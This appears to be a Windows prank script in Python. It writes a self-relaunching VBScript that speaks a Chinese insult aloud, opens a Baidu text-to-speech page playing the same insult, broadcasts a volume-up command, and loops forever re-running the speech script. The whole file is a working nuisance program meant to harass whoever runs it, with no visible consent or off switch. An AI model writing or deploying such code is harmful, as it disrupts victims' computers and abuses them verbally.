import time
from win32api import SendMessage as sm
import webbrowser
import os
import threading

if not os.path.exists('C:\\delicious\\walnut\\waffles'):
    os.makedirs('C:\\delicious\\walnut\\waffles')
os.chdir('C:\\delicious\\walnut\\waffles')
blessing = b'\xe4\xbd\xa0\xe8\xbf\x99\xe4\xb8\xaa\xe5\xa4\xa7\xe5\x82\xbb\xe9\x80\xbc\xe8\xbf\x98\xe6\x83\xb3\xe6\x89\xbe\xe5\xaf\xb9\xe8\xb1\xa1\xef\xbc\x8c\xe4\xbd\xa0\xe5\x81\x9a\xe6\xa2\xa6\xe5\x90\xa7\xef\xbc\x81'
frog = b'\xe5\xad\xa4\xe5\xaf\xa1'
with open('blessing.vbs', 'w') as f:
    f.write(
        'CreateObject("SAPI.SpVoice").Speak"' + blessing.decode() + frog.decode() * 10 + '"\nwscript.sleep(200000)\nCreateObject("WScript.Shell").run "wscript blessing.vbs", , True')
webbrowser.open(
    'https://tts.baidu.com/text2audio?tex=%E4%BD%A0%E8%BF%99%E4%B8%AA%E5%A4%A7%E5%82%BB%E9%80%BC%E8%BF%98%E6%83%B3%E6%89%BE%E5%AF%B9%E8%B1%A1%EF%BC%8C%E4%BD%A0%E5%81%9A%E6%A2%A6%E5%90%A7&cuid=baike&lan=ZH&ctp=1&pdt=301&vol=9&rate=32&pe')
time.sleep(2)

t1 = threading.Thread(target=sm, args=(-1, 0x319, 0x30292, 0xa0000))
while 1:
    if not t1.is_alive():
        t1.start()
    print(os.system('echo {0}{1}&&blessing.vbs'.format(blessing.decode(), frog.decode() * 100)))
    time.sleep(time.localtime().tm_sec * 10 + 1)
